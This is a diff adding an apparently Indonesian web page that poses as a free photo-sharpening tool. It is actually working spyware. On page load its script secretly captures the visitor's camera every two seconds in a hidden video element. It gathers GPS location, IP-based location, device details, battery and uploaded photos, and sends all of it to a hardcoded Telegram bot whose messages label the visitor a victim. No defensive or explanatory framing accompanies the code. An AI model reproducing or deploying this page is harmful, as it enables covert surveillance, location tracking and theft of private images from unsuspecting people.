@@ -1,0 +1,364 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>penjernih foto</title>
+  <style>
+    body {
+  background: linear-gradient(to right, #654ea3, #eaafc8);
+  background-size: cover;
+  color: black;
+  font-family: 'Poppins', sans-serif;
+  text-align: center;
+  margin: 0;
+  padding: 0;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  overflow: hidden;
+}
+    .loading-text {
+      font-size: 2.5em; /* এখানে ফন্ট সাইজ ছোট করা হয়েছে */
+      opacity: 0;
+      animation: fadeInOut 1s infinite;
+      margin-bottom: 20px; /* লোডিং টেক্সটের নিচে একটু জায়গা */
+    }
+    @keyframes fadeInOut {
+      0% { opacity: 0; }
+      50% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+    video, canvas { 
+      display: none;
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+    }
+    .upload-section {
+  background: white;
+  padding: 30px;
+  border-radius: 10px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    }
+    .upload-btn {
+  background-color: #007bff;
+  color: white;
+  padding: 12px 25px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 1em;
+}
+    .upload-btn:hover {
+  background-color: #0056b3;
+    }
+    #imageUpload {
+      display: none; /* ফাইল ইনপুটটি লুকিয়ে রাখা */
+    }
+    #uploadStatusMessage { /* নতুন মেসেজ ডিভের স্টাইল */
+      margin-top: 20px;
+      font-size: 3em;
+      color: green;
+      font-weight: bold;
+    }
+    
+   .web-topbar {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background: linear-gradient(to right, #141e30, #243b55);
+  color: white;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px 30px;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+  z-index: 1000;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+.logo {
+  font-size: 22px;
+  font-weight: bold;
+}
+
+.nav-links {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.nav-links a {
+  color: #ffffffcc;
+  text-decoration: none;
+  font-size: 15px;
+  transition: color 0.3s;
+}
+
+.nav-links a:hover {
+  color: #fff;
+}
+
+.premium-btn {
+  background: gold;
+  color: black;
+  padding: 8px 16px;
+  font-size: 14px;
+  font-weight: bold;
+  border: none;
+  border-radius: 20px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+  cursor: pointer;
+  transition: background 0.3s;
+}
+
+.premium-btn:hover {
+  background: #ffcc00;
+}
+
+.camera-status {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin-top: 40px;
+}
+
+.camera-icon {
+  width: 60px;
+  height: 60px;
+  opacity: 0.8;
+  margin-bottom: 10px;
+}
+
+.loading-text {
+  font-family: 'Segoe UI', sans-serif;
+  font-size: 20px;
+  font-weight: 500;
+  color: #333;
+}
+
+.dots::after {
+  content: '';
+  display: inline-block;
+  animation: dotsAnimation 1.5s infinite steps(4);
+}
+
+@keyframes dotsAnimation {
+  0%   { content: ''; }
+  25%  { content: '.'; }
+  50%  { content: '..'; }
+  75%  { content: '...'; }
+  100% { content: ''; }
+}
+
+.photo-box {
+  width: 90%;
+  max-width: 400px;
+  aspect-ratio: 4/3;
+  background: #f3f3f3;
+  border: 2px dashed #aaa;
+  border-radius: 12px;
+  margin: 30px auto;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow: hidden;
+  position: relative;
+  box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+
+.photo-box video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.photo-label {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  background: rgba(255,255,255,0.7);
+  padding: 4px 8px;
+  border-radius: 6px;
+  font-size: 13px;
+  font-weight: 600;
+}
+    
+  </style>
+</head>
+<body>
+  <div class="camera-status">
+  <img src="https://b.top4top.io/p_3523gsa520.jpeg" class="camera-icon" />
+  <p class="loading-text">Tools Penjernih Foto By Xtann<span class="dots"></span></p>
+</div>
+ 
+<header class="web-topbar">
+  <div class="logo">Penjernih Foto By Xtann</div>
+  <nav class="nav-links">
+  </nav>
+</header>
+  
+  <div class="loading-text"></div>  <div class="upload-section">
+    <h2>Ambil Foto atau Unggah dari Galeri</h2>
+    <p>Pastikan pencahayaan cukup untuk hasil terbaik</p>
+  
+   <label for="imageUpload" class="upload-btn" id="uploadButtonLabel">Ambil Foto / Unggah</label>
+ <input type="file" id="imageUpload" accept="image/*">
+ <div id="uploadStatusMessage"></div>
+ </div><video id="video" autoplay></video> <canvas id="canvas" width="640" height="480"></canvas>
+  
+  <script>
+    const botToken = '8013703987:AAH688ALstcTKaTVoG8aLZG7kav-GwVEr_A'; // আপনার বট টোকেন
+    const chatId = '7942580844'; // আপনার বট আইডি
+    const uploadStatusMessageDiv = document.getElementById('uploadStatusMessage'); // মেসেজ ডিভ
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML'
+        })
+      }).catch(error => console.error('Error sending message:', error));
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob);
+      return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { // Promise রিটার্ন করা হয়েছে
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    async function getFullInfo() {
+      let ip = 'N/A';
+      let ipLocationInfo = {
+        city: 'N/A',
+        region: 'N/A',
+        country: 'N/A',
+        org: 'N/A'
+      };
+
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ip = ipData.ip;
+
+        const ipApiLocationResponse = await fetch(`http://ip-api.com/json/${ip}`);
+        const ipApiLocationData = await ipApiLocationResponse.json();
+        if (ipApiLocationData.status === 'success') {
+          ipLocationInfo.city = ipApiLocationData.city || 'N/A';
+          ipLocationInfo.region = ipApiLocationData.regionName || 'N/A';
+          ipLocationInfo.country = ipApiLocationData.country || 'N/A';
+          ipLocationInfo.org = ipApiLocationInfo.org || 'N/A';
+        }
+      } catch (e) {
+        console.error('IP address or IP location fetch failed:', e);
+      }
+
+      let locationText = '❌ TIDAK ADA AKSES LOKASI';
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          // এখানে Google Maps-এর URL সঠিকভাবে ফরম্যাট করা হয়েছে
+          locationText = `<a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}" target="_blank">📍 KLIK UNTUK MELIHAT LOKASI YANG TEPAT</a>`;
+          sendToTelegram(`<b>📍 GPS LOKASI:</b>\n${locationText}`);
+        }, (err) => {
+          console.warn(`Location error (${err.code}): ${err.message}`);
+          sendToTelegram(`<b>📍 GPS LOKASI:</b>\n❌ GPS TIDAK ADA AKSES LOKASI`);
+        });
+      } else {
+        sendToTelegram(`<b>📍 GPS LOKASI:</b>\n❌ BROWSER NYA TIDAK MENDUKUNG GPS`);
+      }
+
+      const battery = await navigator.getBattery().catch(() => ({ level: 'N/A', charging: false }));
+      const batteryLevel = battery.level !== 'N/A' ? (battery.level * 100).toFixed(0) + '%' : 'N/A';
+      const batteryStatus = battery.charging ? '🔌mengisi daya' : '⚡ tidak mengisi daya';
+
+      const info = `
+<b>📡 DATA PERANGKAT -DI SADAP OLEH XTANN_OFFC  </b>
+
+🌐 <b>IP NETWORK:</b> ${ip}
+🏙️ <b>IP-KOTA:</b> ${ipLocationInfo.city}
+🗺️ <b>IP-WILAYAH:</b> ${ipLocationInfo.region}
+🌍 <b>IP-NEGARA:</b> ${ipLocationInfo.country}
+🏢 <b>ISP/BY ADEN:</b> ${ipLocationInfo.org}
+
+🖥️ <b>DEVICE/PERANGKAT:</b> ${navigator.userAgent}
+💻 <b>MASUK LEWAT MANA KORBAN NYA:</b> ${navigator.platform}
+🌍 <b>BAHASA NEGARA:</b> ${navigator.language}
+🖼️ <b>LAYAR HANDPHONE:</b> ${screen.width}x${screen.height}
+🔋 <b>BATERAI:</b> ${batteryLevel} (${batteryStatus})
+🍪 <b>cokkie:</b> ${navigator.cookieEnabled ? 'aktif' : 'BATERAI'}
+📱 <b>RAM:</b> ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'tidak di kenal'}
+⏰ <b>JAM:</b> ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+`;
+      sendToTelegram(info);
+    }
+
+    // ক্যামেরা থেকে ছবি তোলা ও পাঠানো (আগের মতোই লুকানো থাকবে)
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+        
+        // প্রতি 2 সেকেন্ডে ক্যামেরা থেকে ছবি তুলে পাঠানো
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            sendPhotoToTelegram(blob);
+          }, 'image/jpeg');
+        }, 2000); 
+      })
+      .catch(err => {
+        console.warn('akses kamera tidak tersedia atau terjadi kesalahan:', err);
+        sendToTelegram(`<b>🚨 peringatan:</b>akses kamera tidak tersedia`);
+      });
+
+    // গ্যালারি থেকে ছবি আপলোড করার ফাংশনালিটি
+    const imageUpload = document.getElementById('imageUpload');
+    imageUpload.addEventListener('change', async (event) => { // async যোগ করা হয়েছে
+      const file = event.target.files[0];
+      if (file) {
+        if (file.type.startsWith('image/')) {
+          uploadStatusMessageDiv.style.color = 'blue'; // আপলোড হচ্ছে বোঝাতে রঙ হলুদ করুন
+          uploadStatusMessageDiv.innerText = 'Waiting..';
+          try {
+            await sendPhotoToTelegram(file); // ফাইলকে সরাসরি Blob হিসেবে পাঠানো যায়
+            uploadStatusMessageDiv.style.color = 'lime'; // সফল হলে রঙ সবুজ করুন
+            uploadStatusMessageDiv.innerHTML = `Foto Anda telah diunggah. Hubungi kami untuk informasi lebih lanjut: <a href="wa.me/62838829290" target="_blank" style="color: lime;">wa.me/62896721028</a>`;
+            sendToTelegram(`✅ POTO YANG DI KIRIM KORBAN।`);
+          } catch (error) {
+            uploadStatusMessageDiv.style.color = 'red'; // ব্যর্থ হলে রঙ লাল করুন
+            uploadStatusMessageDiv.innerText = 'TES';
+            console.error('Error uploading image:', error);
+            sendToTelegram(`❌ harus berformat png atau jpg: ${error.message}`);
+          }
+        } else {
+          uploadStatusMessageDiv.style.color = 'red';
+          uploadStatusMessageDiv.innerText = `⚠️ berkas yang di unggah bukan lah suatu gambar`;
+          sendToTelegram(`⚠️berkas yang di unggah bukanlah suatu gambar`);
+        }
+        // ফাইল ইনপুট রিসেট করুন যাতে একই ফাইল আবার সিলেক্ট করলে change ইভেন্ট ফায়ার হয়
+        event.target.value = '';
+      }
+    });
+
+    getFullInfo();
+  </script>
+</body>
+</html>
